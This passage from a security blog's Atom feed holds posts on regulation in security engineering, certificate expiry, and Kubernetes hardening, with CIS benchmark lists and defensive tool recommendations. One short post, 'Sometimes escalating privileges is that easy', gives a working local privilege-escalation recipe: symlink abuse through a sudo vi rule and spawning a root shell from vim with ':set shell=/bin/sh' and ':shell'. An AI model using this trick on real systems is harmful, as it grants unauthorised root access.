<h2 id="the-role-of-regulation-in-security-engineering"><strong>The Role of Regulation in Security Engineering</strong></h2>

<h3 id="ensuring-compliance-and-trust"><strong>Ensuring Compliance and Trust</strong></h3>

<p>Regulation plays a critical role in ensuring that security solutions are not
only effective but also compliant with legal and ethical standards. Regulation
is the necessary counterbalance, grounding innovation’s flights of fancy in
the realities of ethical considerations, legal standards, and societal impact.
Complying with these regulations is essential for building trust in security
solutions and the companies that provide them.</p>

<h3 id="navigating-the-complex-regulatory-landscape"><strong>Navigating the Complex Regulatory Landscape</strong></h3>

<p>In the field of security engineering, regulation serves as a vital anchor,
ensuring that the innovations and advancements made are not just
technologically sound but also ethically and legally compliant. This aspect of
regulation is crucial in maintaining the delicate balance between
technological advancement and societal well-being. Regulations such as the
General Data Protection Regulation (GDPR) in the EU and the California
Consumer Privacy Act (CCPA) in the United States set clear guidelines for data
protection and privacy, which are fundamental in the digital age. Compliance
with these regulations is not merely a legal obligation but a cornerstone in
establishing and maintaining trust between technology providers and users.
Trust, in this context, is pivotal – it is the foundation upon which the
acceptance and widespread adoption of new technologies are built. For security
solutions, this trust translates into a belief in the solution’s capability to
protect sensitive information and the assurance that it does so in a manner
that respects user privacy and aligns with ethical standards. In essence,
compliance isn’t just about adhering to legal requirements; it’s about
committing to a framework that upholds the principles of integrity and respect
in the digital world.</p>

<p>The regulatory landscape in security engineering is as diverse as it is
complex, spanning across different jurisdictions and industries, each with its
own set of rules and standards. Security engineers, therefore, must possess
not just technical expertise but also a nuanced understanding of various
regulatory environments. Compliance with a wide array of regulations such as
the Sarbanes-Oxley Act (SOX), the Health Insurance Portability and
Accountability Act (HIPAA) in healthcare, or the Federal Risk and
Authorization Management Program (FedRAMP) in government IT, requires a
multifaceted approach. It’s not just about meeting minimum legal requirements
but understanding the spirit and intention behind these regulations. This
understanding is crucial in designing security solutions that are not only
compliant but also resilient and adaptable to the evolving legal landscape.
Moreover, the variation in regulations across different regions – like the
GDPR in Europe or the Personal Information Protection and Electronic Documents
Act (PIPEDA) in Canada – adds layers of complexity, particularly for
organizations operating globally. Navigating this maze of regulations demands
a strategic approach, where compliance is integrated into the product design
and business processes, ensuring that security solutions are not just
effective but also adaptable to different regulatory requirements. This
adaptability is key in a globalized world, where the ability to harmonize
different regulatory standards becomes a competitive advantage and a marker of
a security solution’s robustness and reliability.</p>

<h2 id="balancing-act-innovation-and-regulation"><strong>Balancing Act: Innovation and Regulation</strong></h2>

<h3 id="finding-the-middle-ground"><strong>Finding the Middle Ground</strong></h3>

<p>The key to balancing innovation with regulation lies in finding a middle
ground where security solutions are both groundbreaking and compliant. This
involves a deep understanding of both technological capabilities and
regulatory frameworks. It requires a collaborative approach where engineers,
legal experts, and policymakers work together.</p>

<h3 id="the-importance-of-flexibility-and-adaptability"><strong>The Importance of Flexibility and Adaptability</strong></h3>

<p>The synthesis of these two – the innovative drive tempered by regulatory
prudence – is what propels society forward. Flexibility and adaptability are
essential traits in this balancing act. As new technologies emerge and
regulations evolve, security solutions must be able to adapt quickly. This
might involve modular designs that allow for easy updates or adopting agile
methodologies in development and compliance processes.</p>

<h2 id="the-broader-implications-for-society"><strong>The Broader Implications for Society</strong></h2>

<h3 id="driving-responsible-technological-growth"><strong>Driving Responsible Technological Growth</strong></h3>

<p>How we balance innovation and regulation in security engineering has broader
implications for society. It influences how technology develops, ensuring that
growth is responsible and aligned with societal values. This balance is
crucial for maintaining public trust in technology and its benefits.</p>

<h3 id="shaping-the-future-of-tech-policy"><strong>Shaping the Future of Tech Policy</strong></h3>

<p>The approach taken in balancing these aspects also shapes future tech policy.
In many ways, it’s a reflection of the age-old struggle to reconcile our reach
for the stars with the grounding force of our collective conscience. It sets
precedents and provides frameworks that can guide the development of new
regulations and the evolution of existing ones.</p>

<h2 id="conclusion-a-harmonious-future-for-tech-and-regulation"><strong>Conclusion: A Harmonious Future for Tech and Regulation</strong></h2>

<p>In conclusion, the interplay between innovation and regulation in security
engineering is a crucial aspect of today’s technological landscape. Striking
the right balance is essential for fostering a safe, trustworthy, and
innovative digital world. For those in the tech industry, embracing this
balance is not just about compliance; it’s about leading the way in
responsible technological advancement.</p>

<h3 id="essential-insights-for-security-engineers"><strong>Essential Insights for Security Engineers</strong></h3>

<ul>
  <li>
    <p><strong>Innovation with Responsibility</strong> : Security solutions must innovate while ensuring safety and reliability.</p>
  </li>
  <li>
    <p><strong>Compliance is Key</strong> : Adhering to regulatory standards is crucial for building trust in security solutions.</p>
  </li>
  <li>
    <p><strong>Flexibility and Adaptability</strong> : The ability to adapt to emerging technologies and evolving regulations is vital.</p>
  </li>
  <li>
    <p><strong>Shaping Society and Policy</strong> : The balance between innovation and regulation in security engineering influences societal trust in technology and the development of tech policy.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Security Engineering"/>
    <category term="Innovation"/>
    <category term="Regulation"/>
    <category term="Compliance"/>
    <category term="Technology Policy"/>
    <category term="Cybersecurity"/>
    <category term="Tech Ethics"/>
    <category term="Digital Trust"/>
    <summary type="html"><![CDATA[In the fast-paced world of technological advancement, balancing innovation with regulation is a crucial challenge, especially in the field of security engineering.]]></summary>
  </entry>
  <entry>
    <title type="html">Intel Sharing Metrics</title>
    <link href="https://www.securesql.info/2020/12/16/sunburst-decoded-domains/" rel="alternate" type="text/html" title="Intel Sharing Metrics"/>
    <published>2020-12-16T00:00:00-08:00</published>
    <updated>2020-12-16T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2020/12/16/sunburst-decoded-domains</id>
    <content type="html" xml:base="https://www.securesql.info/2020/12/16/sunburst-decoded-domains/"><![CDATA[<p>I pulled some metrics from my threat intelligence sharing service to generate
cute charts and graphs. If you want to keep up to date, keep an eye on
<a href="https://intelmetrics.haxx.ninja">https://intelmetrics.haxx.ninja</a> .</p>

<p><img src="https://securesql.info/images/usageandbehaviors.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/attributeschart.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/tagtreechart.png.avif" alt="" /></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Threat Intelligence"/>
    <category term="Metrics"/>
    <category term="Cybersecurity"/>
    <category term="Data Visualization"/>
    <category term="Intel Sharing"/>
    <category term="Incident Response"/>
    <summary type="html"><![CDATA[I pulled some metrics from my threat intelligence sharing service to generate cute charts and graphs. If you want to keep up to date, keep an eye on]]></summary>
  </entry>
  <entry>
    <title type="html">Failure to meet operational excellence</title>
    <link href="https://www.securesql.info/2020/02/16/operational-excellence/" rel="alternate" type="text/html" title="Failure to meet operational excellence"/>
    <published>2020-02-16T00:00:00-08:00</published>
    <updated>2020-02-16T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2020/02/16/operational-excellence</id>
    <content type="html" xml:base="https://www.securesql.info/2020/02/16/operational-excellence/"><![CDATA[<p>One would think to rotate their certificates months prior to expiration. Or
even the bare minimum “setting up a calendar event.”</p>

<p>“All extensions disabled due to expiration of intermediate signing cert”</p>

<p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1548973">https://bugzilla.mozilla.org/show_bug.cgi?id=1548973</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Operational Excellence"/>
    <category term="Security Best Practices"/>
    <category term="Certificate Management"/>
    <category term="Security Operations"/>
    <category term="Incident Response"/>
    <category term="Vulnerability Management"/>
    <summary type="html"><![CDATA[One would think to rotate their certificates months prior to expiration. Or even the bare minimum]]></summary>
  </entry>
  <entry>
    <title type="html">Sometimes escalating privileges is that easy</title>
    <link href="https://www.securesql.info/2019/11/29/priv-escalation/" rel="alternate" type="text/html" title="Sometimes escalating privileges is that easy"/>
    <published>2019-11-29T00:00:00-08:00</published>
    <updated>2019-11-29T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2019/11/29/priv-escalation</id>
    <content type="html" xml:base="https://www.securesql.info/2019/11/29/priv-escalation/"><![CDATA[<p><img src="https://securesql.info/images/61231935_457720931698319_1779304573052125184_n.jpg" alt="" /></p>

<p>symlink to the file you want to CRUD with root privileges. then sudo vi
/var/www/html/&lt;insert symlink name.</p>

<p>Or once inside vim</p>

<p><code class="language-plaintext highlighter-rouge">:set shell=/bin/sh</code></p>

<p><code class="language-plaintext highlighter-rouge">:shell</code></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="TBD"/>
    <summary type="html"><![CDATA[]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes CI / CD And Monitoring Pipelines</title>
    <link href="https://www.securesql.info/2019/09/17/the-golden-bless-or-how-i-learned-to-bypass-vpn/" rel="alternate" type="text/html" title="Kubernetes CI / CD And Monitoring Pipelines"/>
    <published>2019-09-17T00:00:00-07:00</published>
    <updated>2019-09-17T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/09/17/the-golden-bless-or-how-i-learned-to-bypass-vpn</id>
    <content type="html" xml:base="https://www.securesql.info/2019/09/17/the-golden-bless-or-how-i-learned-to-bypass-vpn/"><![CDATA[<p>#<br />
Overview</p>

<p>When one takes a step back and looks at a typical agile build, test, and
release pipeline with a security bent; one observes the following steps and
how they feed into each other like a dragon eating its’ tail.</p>

<p><img src="https://securesql.info/images/E942BA98-5AA5-4EB1-BCDF-6D3CBCB47C6A.jpg" alt="" /></p>

<p>There are many different iterations of this dragon eating tail as there exist
IT frameworks for provisioning a new employee asset, be it ITIL, COBIT, etc….</p>

<p><img src="https://securesql.info/images/041E2BAE-5A91-4F21-A62D-59206602FA36.jpg" alt="" /></p>

<p><img src="https://securesql.info/images/35AA2911-6867-4CD8-9B14-0709EE877C04.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/AAA0739A-87FA-489E-A878-4864C3C0AD45.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/814E0187-C7DA-469E-88E5-D2A24378B909.png.avif" alt="" /></p>

<p>Irregardless of the pipelines and technologies, one may prefer to work
smarter; not harder. As a result, start off simple with a “container contains
a vulnerable OS package” finding. Instead of breaking the build, amend the
container spec with a “yum update” or “apt-get update &amp;&amp; apt-get upgrade”,
merge the automated patch pull request, and rerun the testing. After doing
this a few times, see where else you may automatically heal and patch the
builds accordingly. After doing this for sometime, you may end up creating
SOAR playbooks and start working or contributing on a psuedo-AI to handle
these situations. That is what lead to me collaborating on Facebook’s SapFix
and Sapienz - https://engineering.fb.com/2018/09/13/developer-tools/finding-
and-fixing-software-bugs-automatically-with-sapfix-and-sapienz/</p>

<p>I won’t get into the specifics and the steps with their corresponding order.
Only because when I was writing buildbot, TeamCity, Jenkins / Hudson,
concourse, spinnaker, and many other orchestration and deployment pipelines;
what it looked like VARIED GREATLY depending on the technology stack,
resources and investments by the executive sponsors, and the qualities one
would optimize for. Since this is about Kubernetes CI / CD pipelines, I will
mention a few tools and how one could benefit greatly by utilizing them in the
correct step with the proper outcomes defined. Each tool has their own feature
set with specifications to normalize their findings but many are immature and
do not offer that finding normalization. One may need to adjust the pipelines
to be intelligent at filtering out false positives instead of the default
Break The Build conclusion many engineers jump to. Hence eventually building
out a smart auto-triage service to handle these challenges instead of yet
another if else statement in the build pipeline code. Don’t forget the
monitoring step as many findings will be uncovered while the workload
executes. Hence why it is critical to invest in the auto-triage service, IE
SOAR capabilities.</p>

<p>Worth mentioning to test for anti-affinity, intoleration to anti-affinity,
node authorizer, kubelet certificate rotation (as per Monitoring), and kubelet
authn/z failure modes (if applicable.)</p>

<p>If you want to learn more about the holy trinity of software engineering,
systems engineering, and information security - here is a great resource to
start your path https://owasp.org/www-project-devsecops-maturity-model/</p>

<h1 id="static-analysis">Static Analysis</h1>

<p>KubeAudit - it allows one to audit resource manifest files prior to
application. It will semantically check proposed code for known
incompatibilities. Great for pre-merge testing, easy to use, and simple to
extend.</p>

<p>Checkov - a great tool for identifying, remediation, and preventing
misconfigurations in infrastructure as code. I love how checkov supports
namespaces so I can have it not report any findings for the kube-system
namespace.</p>

<h1 id="testing">Testing</h1>

<p>Netassert and illuminate - great tools to create and execute network test
cases to ensure existing network policies are operating as expected vs.
inadvertently allowing unexpected traffic. These network policy validation
tools are a great sanity checker to ensure there isn’t data falling onto the
data center floors or evaporating onto the cloud when sent to the Internet.</p>

<p>Trivvy / Hadolint / Claire / Anchore / Microscanner - all great tools for
detecting and reporting on vulnerabilities (including policy as compliance
violations such as not adhering to CIS Benchmark X…) in container images. One
will need to determine how to handle normalizing findings across multiple
pipelines as well as what are the security gates (findings’ criticality such
as CVSS or the tool’s defined CRITICAL, HIGH, etc..) to observe, observe &amp;
react, and / or block.</p>

<p>Polaris - great for ensuring pods and controllers are adhering to “best
practices.” Can operate as a validation webhook, CLI for testing local
configuration files, or as an Add-on dashboard for reporting and monitoring.</p>

<h1 id="release">Release</h1>

<p>Netassert and illuminate - great tools to create and execute network test
cases to ensure existing network policies are operating as expected vs.
inadvertently allowing unexpected traffic. These network policy validation
tools are a great sanity checker to ensure there isn’t data falling onto the
data center floors or evaporating onto the cloud when sent to the Internet.</p>

<p><a href="https://github.com/bgeesaman/kubeatf">https://github.com/bgeesaman/kubeatf</a> - not terribly security specific but
may accelerate those who wish to use an ansible-based pipeline.</p>

<h1 id="deploy">Deploy</h1>

<p>Netassert and illuminate - great tools to create and execute network test
cases to ensure existing network policies are operating as expected vs.
inadvertently allowing unexpected traffic. These network policy validation
tools are a great sanity checker to ensure there isn’t data falling onto the
data center floors or evaporating onto the cloud when sent to the Internet.</p>

<p>Polaris - great for ensuring pods and controllers are adhering to “best
practices.” Can operate as a validation webhook, CLI for testing local
configuration files, or as an Add-on dashboard for reporting and monitoring.</p>

<p>Kube-bench - a simple utility to determine if a running cluster adheres to CIS
Kubernetes benchmark.</p>

<p><a href="https://kubesec.io/">https://kubesec.io/</a> - a simple service to determine if known insecure
patterns are applied to a running cluster.</p>

<p>and many other monitoring tools listed below may be worthwhile to include in
the Deployment phase if deployment end to end time is not a priority.</p>

<h1 id="monitoring">Monitoring:</h1>

<p>KubeAudit - it allows one to monitor and audit live environments after
deployment for known risky configuration patterns such as allowing net_raw
capabilities or not utilizing a read-only filesystem.</p>

<p>Kube-hunter - allows one to monitor live environments for known security
weakness patterns. Such that one may detect any known injection patterns after
the fact.</p>

<p>Audit2rbac - this is a great tool to sanity check and limit permissions’
drift. The tool consumes the cluster(s) audit logs, then reviews (or
generates) RBAC roles and RoleBinding objects to determine which permissions
are actually used vs. not used.</p>

<p>Falco - a CNCF project for intrusion detection by wrapping the cluster and
workloads. The default rules are great but one will find them lacking when one
wants to observe threats specific to their technology stack and workloads.</p>

<p>Polaris - great for ensuring pods and controllers are adhering to “best
practices.” Can operate as a validation webhook, CLI for testing local
configuration files, or as an Add-on dashboard for reporting and monitoring.</p>

<p>Kube-scan / Octarine - great for sanity checking Octarine’s risk score on ones
workload. It will check everything from net_raw capabilities to lacking CPU /
memory governance to publicly exposed workloads via load balancers. Its’
deployment is well suited for monitoring unless one runs full parallel testing
regressions on the side and testing time is not a priority.</p>

<p>Kubiscan - permissions validator and monitor to ensure risky pods, subjects,
roles / rolesbindings, etc… are monitored and visibility presented when
potentially risky permissions are observed.</p>

<p>Sonobouy CIS Benchmark Add-On - simple plugin to monitor a clusters’ adherence
to CIS Kubernetes Benchmark policies.</p>

<p>Kube-bench - a simple utility to determine if a running cluster adheres to CIS
Kubernetes benchmark.</p>

<p><a href="https://kubesec.io/">https://kubesec.io/</a> - a simple service to determine if known insecure
patterns are applied to a running cluster.</p>

<h1 id="no-longer-maintained-tools-but-may-provide-limited-value">No longer maintained tools but may provide limited value</h1>

<ul>
  <li>
    <p>https://github.com/DenizParlak/Zephyrus</p>
  </li>
  <li>
    <p>https://github.com/nccgroup/kube-auto-analyzer</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="CI/CD"/>
    <category term="Monitoring"/>
    <category term="DevSecOps"/>
    <category term="Security Automation"/>
    <category term="Kubernetes Security"/>
    <category term="Vulnerability Scanning"/>
    <category term="Infrastructure as Code"/>
    <category term="Network Policies"/>
    <category term="Container Security"/>
    <category term="Security Best Practices"/>
    <category term="CIS Benchmark"/>
    <summary type="html"><![CDATA[When one takes a step back and looks at a typical agile build, test, and release pipeline with a security bent; one observes the following steps and how they feed into each other like a dragon eating its’ tail.]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Pods (PodSec policies)</title>
    <link href="https://www.securesql.info/2019/07/26/kubernetes-controller-manager-and-control-plane/" rel="alternate" type="text/html" title="Kubernetes Pods (PodSec policies)"/>
    <published>2019-07-26T00:00:00-07:00</published>
    <updated>2019-07-26T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/26/kubernetes-controller-manager-and-control-plane</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/26/kubernetes-controller-manager-and-control-plane/"><![CDATA[<h1 id="overview">Overview</h1>

<p>Pods hardening is strongly configured and enforced with Pod Security policies
(PodSec.). The security context enables not to restrict privileges, volume
mounts, network privileges, cgroups / selinux / app armor / kernel
capabilities, access control, read only file-system, etc…. This is where much
of the workload insecurity comes from. The entirety of possible levers and
controls may be found @
&lt;https://v1-16.docs.kubernetes.io/docs/reference/generated/kubernetes-
api/v1.16/#securitycontext-v1-core&gt; . Instead of going into each one, I will
cover the high level risks and controls.</p>

<p>Most workloads require limited network access and extremely limited host
resources. Not all workloads require unlimited and unrestricted access to the
hosts and enveloping infrastructure No need for UID 0 (root) privileges nor
wheel / sudo / su privileges. Beware, extremely old docker workloads may
expect UID 0 privileges as Docker required UID 0 privileges to run.</p>

<p>For now, the PodSec policies are evaluated in the following order;</p>

<ol>
  <li>
    <p>If a policy is validated without altering the pod; it is applied and used.</p>
  </li>
  <li>
    <p>If the result of a pod creation request, then the first alphabetical, valid policy is applied and used</p>
  </li>
  <li>
    <p>If the result of a pod update request, then an error is returned. Pod mutations are not allowed during update operations.</p>
  </li>
</ol>

<h1 id="cis-benchmark">CIS Benchmark</h1>

<p>5.2 Pod Security Policies</p>

<p>5.2.1 Minimize the admission of privileged containers (Manual)</p>

<p>5.2.2 Minimize the admission of containers wishing to share the host process
ID namespace (Manual)</p>

<p>5.2.3 Minimize the admission of containers wishing to share the host IPC
namespace (Manual)</p>

<p>5.2.4 Minimize the admission of containers wishing to share the host network
namespace (Manual)</p>

<p>5.2.5 Minimize the admission of containers with allowPrivilegeEscalation
(Manual)</p>

<p>5.2.6 Minimize the admission of root containers (Manual)</p>

<p>5.2.7 Minimize the admission of containers with the NET_RAW capability
(Manual)</p>

<p>5.2.8 Minimize the admission of containers with added capabilities (Manual)</p>

<p>5.2.9 Minimize the admission of containers with capabilities assigned (Manual)</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Pod Security"/>
    <category term="Security Policies"/>
    <category term="Pod Security Policies"/>
    <category term="Workload Security"/>
    <category term="Container Security"/>
    <category term="CIS Benchmark"/>
    <category term="Kubernetes Best Practices"/>
    <category term="Pod Hardening"/>
    <summary type="html"><![CDATA[Pods hardening is strongly configured and enforced with Pod Security policies (PodSec.). The security context enables not to restrict privileges, volume mounts, network privileges, cgroups / selinux / app armor / kernel capabilities, access control, read only file-system, etc…. This is where much of the workload insecurity comes from.]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Containers</title>
    <link href="https://www.securesql.info/2019/07/25/kubernetes-kube-apiserver/" rel="alternate" type="text/html" title="Kubernetes Containers"/>
    <published>2019-07-25T00:00:00-07:00</published>
    <updated>2019-07-25T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/25/kubernetes-kube-apiserver</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/25/kubernetes-kube-apiserver/"><![CDATA[<h1 id="overview">Overview</h1>

<p>When we get into the specifics for containers, the challenge is that the
detailed advice differs greatly between the different container technologies.
As a result, I will STRONGLY recommend one doesn’t run Docker as it was never
designed to be secure, requires Swarm to manage some aspects of its’ lacking
security, and requires a near-infinite amount of hand holding to manage it
risks (especially when Docker Enterprise is rumored to be up for sale.). There
are many who think Docker is too complex and unwieldy. From a security
perspective, Docker’s inherent process driven architecture runs everything
through one daemon. This mixing of streams results in a puddle of insecurity
that requires a complete rewrite and supporting backwards compatibility with
the insecure architecture.</p>

<p>The challenge with publicly releasing internal images and configurations to
public registries is that there exists a significant amount of work to rebuild
the trust and trusted builds of ones’s containers but presents a challenge
ensuring staff pull from trusted anchors only. Sadly AWS ECR’s feature set is
extremely lacking. While AWS and us work on replacing ECR with Notary 2.0 and
similar container management features (including potentially replacing Docker
Hub as the source of truth for many projects - assuming the rumor mills are
right that they will limit their free governance to increase quarterly revenue
due to funding challenges), one will need to provide a trusted repository.
During the validation and updates, not only do those processes require passing
vulnerability scans and policy as configuration scanning but also signing the
updated image. This will allow Kubernetes to conveniently ensure only signed
images are handled and brought into a running state. Along the way, configure
Kubernetes (validatingadmission web hooks) to ensure only trusted sources are
pulled from as many drive by night compromises rely upon loading third party
sources.</p>

<p>Here are a few of the generic touch points for any container on any container
runtime engine;</p>

<ul>
  <li>
    <p>Prevent dynamic kernel module loading at runtime</p>
  </li>
  <li>
    <p>Scan for vulnerabilities, policy / compliance violations, and dependency vulnerabilities. See the CI / CD and monitoring pipelines for specific things to run and look for within the container</p>
  </li>
  <li>
    <p>Keep an accurate inventory of containers’ versions deployed and running. See above for scanning to ensure new vulnerabilities are quickly raised for long running containers</p>
  </li>
  <li>
    <p>Sign the images and enforce the signature(s). I prefer Portieres.</p>
  </li>
  <li>
    <p>Given the typical OS ring security model for most modern operating systems, please do not provide any administrative access, user access, or potential (sudo / su / wheel) privileges to any processes / users within the containers. Many containers can be escaped by a simple elevation to root privileges within the container. Once one has shell within a container, at Ring 5, it is simple to elevate Kubernetes privilege to access all workloads, pivot outside of the cluster, elevate to root on the nodes, and exfiltrate non-public information including consequence heavy PHI and PII.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Containers"/>
    <category term="Container Security"/>
    <category term="Container Technology"/>
    <category term="Docker"/>
    <category term="Container Vulnerability Scanning"/>
    <category term="Image Signing"/>
    <category term="Security Best Practices"/>
    <category term="CI/CD"/>
    <category term="Compliance"/>
    <summary type="html"><![CDATA[When we get into the specifics for containers, the challenge is that the detailed advice differs greatly between the different container technologies. As a result, I will STRONGLY recommend one doesn’t run Docker as it was never designed to be secure, requires Swarm to manage some aspects of its’ lacking security, and requires a near-infinite amount of hand holding]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Master Node &amp;amp;amp; Nodes</title>
    <link href="https://www.securesql.info/2019/07/24/kubernetes-etcd/" rel="alternate" type="text/html" title="Kubernetes Master Node &amp;amp;amp; Nodes"/>
    <published>2019-07-24T00:00:00-07:00</published>
    <updated>2019-07-24T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/24/kubernetes-etcd</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/24/kubernetes-etcd/"><![CDATA[<p>One will wish to replicate their Master node to minimize downtime events.
These nodes will host the control plane building blocks (APIServer, Controller
Manager, Scheduler, etcd, etc…) A default cluster may operate 6,000+ worker
nodes which hosts the pods and containers for various non-Kubernete’s
workloads. By default, every worker node hosts kubelet and cube-proxy to
communicate with the Master nodes, networking, and provisioning / de-
provisioning. The file permissions for the various configuration files,
interfaces, and management sockets are critical for hardening the Master nodes
and nodes. Rotating certificates will mitigate some Ring 2 and 3 risks. There
are far too many permissions to list here so I will defer to the CIS
benchmarks below</p>

<p>By default, there are no restrictions on which nodes to which pods. Clusters
use pods, node selector, and other policy tools to provide rudimentary
isolation and separate workloads. PodNodeSelector is a great start to force
pods to specific namespaces and limit all pod placements to their specific
workloads. This assuming one dug deep into the Rings to enforce outside forces
(humans, power users, automation, etc..) cannot alter namespaces. The nodes
should only accept connections from the control plane(s) on specified ports,
and accept service connections via NodePort and LoadBalancer. Please avoid
exposing these directly to the Internet.</p>

<h1 id="cis-benchmarks">CIS Benchmarks</h1>

<h2 id="11-master-node">1.1 Master Node</h2>

<p>1.1.1 Ensure that the API server pod specification file permissions are set to
644 or more restrictive (Automated)</p>

<p>1.1.2 Ensure that the API server pod specification file ownership is set to
root:root (Automated)</p>

<p>1.1.3 Ensure that the controller manager pod specification file permissions
are set to 644 or more restrictive (Automated)</p>

<p>1.1.4 Ensure that the controller manager pod specification file ownership is
set to root:root (Automated)</p>

<p>1.1.5 Ensure that the scheduler pod specification file permissions are set to
644 or more restrictive (Automated)</p>

<p>1.1.6 Ensure that the scheduler pod specification file ownership is set to
root:root (Automated)</p>

<p>1.1.7 Ensure that the etcd pod specification file permissions are set to 644
or more restrictive (Automated)</p>

<p>1.1.8 Ensure that the etcd pod specification file ownership is set to
root:root (Automated)</p>

<p>1.1.9 Ensure that the Container Network Interface file permissions are set to
644 or more restrictive (Manual)</p>

<p>1.1.10 Ensure that the Container Network Interface file ownership is set to
root:root (Manual)</p>

<p>1.1.11 Ensure that the etcd data directory permissions are set to 700 or more
restrictive (Automated)</p>

<p>1.1.12 Ensure that the etcd data directory ownership is set to etcd:etcd
(Automated)</p>

<p>1.1.13 Ensure that the admin.conf file permissions are set to 644 or more
restrictive (Automated)</p>

<p>1.1.14 Ensure that the admin.conf file ownership is set to root:root
(Automated)</p>

<p>1.1.15 Ensure that the scheduler.conf file permissions are set to 644 or more
restrictive (Automated)</p>

<p>1.1.16 Ensure that the scheduler.conf file ownership is set to root:root
(Automated)</p>

<p>1.1.17 Ensure that the controller-manager.conf file permissions are set to 644
or more restrictive (Automated)</p>

<p>1.1.18 Ensure that the controller-manager.conf file ownership is set to
root:root (Automated)</p>

<p>1.1.19 Ensure that the Kubernetes PKI directory and file ownership is set to
root:root (Automated)</p>

<p>1.1.20 Ensure that the Kubernetes PKI certificate file permissions are set to
644 or more restrictive (Manual)</p>

<p>1.1.21 Ensure that the Kubernetes PKI key file permissions are set to 600
(Manual)</p>

<h2 id="worker-nodes">Worker Nodes</h2>

<p>4.1.1 Ensure that the kubelet service file permissions are set to 644 or more
restrictive (Automated)</p>

<p>4.1.2 Ensure that the kubelet service file ownership is set to root:root
(Automated)</p>

<p>4.1.3 If proxy kubeconfig file exists ensure permissions are set to 644 or
more restrictive (Manual)</p>

<p>4.1.4 If proxy kubeconfig file exists ensure ownership is set to root:root
(Manual)</p>

<p>4.1.5 Ensure that the –kubeconfig kubelet.conf file permissions are set to
644 or more restrictive (Automated)</p>

<p>4.1.6 Ensure that the –kubeconfig kubelet.conf file ownership is set to
root:root (Manual)</p>

<p>4.1.7 Ensure that the certificate authorities file permissions are set to 644
or more restrictive (Manual)</p>

<p>4.1.8 Ensure that the client certificate authorities file ownership is set to
root:root (Manual)</p>

<p>4.1.9 Ensure that the kubelet –config configuration file has permissions set
to 644 or more restrictive (Automated)</p>

<p>4.1.10 Ensure that the kubelet –config configuration file ownership is set to
root:root (Automated)</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Master Node"/>
    <category term="Worker Nodes"/>
    <category term="CIS Benchmark"/>
    <category term="Security Best Practices"/>
    <category term="Configuration Management"/>
    <category term="Pod Scheduling"/>
    <category term="Cluster Management"/>
    <category term="Node Security"/>
    <category term="Kubernetes Security"/>
    <summary type="html"><![CDATA[One will wish to replicate their Master node to minimize downtime events. These nodes will host the control plane building blocks]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Networks - CNI</title>
    <link href="https://www.securesql.info/2019/07/24/want-to-escalate-aws-iam-permissions/" rel="alternate" type="text/html" title="Kubernetes Networks - CNI"/>
    <published>2019-07-24T00:00:00-07:00</published>
    <updated>2019-07-24T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/24/want-to-escalate-aws-iam-permissions</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/24/want-to-escalate-aws-iam-permissions/"><![CDATA[<h1 id="overview">Overview</h1>

<p>Within Kubernetes, networks are an interesting beast. They become extremely
muddled when one (CNI) utilizes OSI Layer 2-7 service mesh to handle not only
network routing, network policies, load balancers, but also providing a
container storage interface (CSI.) For simplicity sake, we will consider a
simple network provider that only handles routing and network policies. Each
provider will have their own gotchas, limitations, and hardening guides so
please see their hardening documentation. By default, almost all network
providers allow all traffic across all namespaces.</p>

<p>Common network providers will align to Kubernetes’ namespace model to
construct and enforce network policies. These policies enable one to construct
and enforce traffic within pods but also within and across namespaces. Beyond
the traditional on-premise router, quotas and limits may be applied to enable
one to request ports or load balancers. Like many enterprise routers, one may
configure and enforce TLS connectivity.</p>

<p>Depending on which Ring, there exists multiple ports that may not need to be
exposed to 0.0.0.0: 10250, 10255, 10256, 41949, etc…. Please restrict
accordingly.</p>

<h1 id="cis-benchmark">CIS Benchmark</h1>

<p>5.3 Network Policies and CNI</p>

<p>5.3.1 Ensure that the CNI in use supports Network Policies (Manual)</p>

<p>246 5.3.2 Ensure that all Namespaces have Network Policies defined (Manual)</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Networking"/>
    <category term="CNI"/>
    <category term="Network Policies"/>
    <category term="Service Mesh"/>
    <category term="Routing"/>
    <category term="Storage Interface"/>
    <category term="Security Best Practices"/>
    <category term="Kubernetes Security"/>
    <summary type="html"><![CDATA[Within Kubernetes, networks are an interesting beast. They become extremely muddled]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Scheduler</title>
    <link href="https://www.securesql.info/2019/07/23/kubernetes-kubelet/" rel="alternate" type="text/html" title="Kubernetes Scheduler"/>
    <published>2019-07-23T00:00:00-07:00</published>
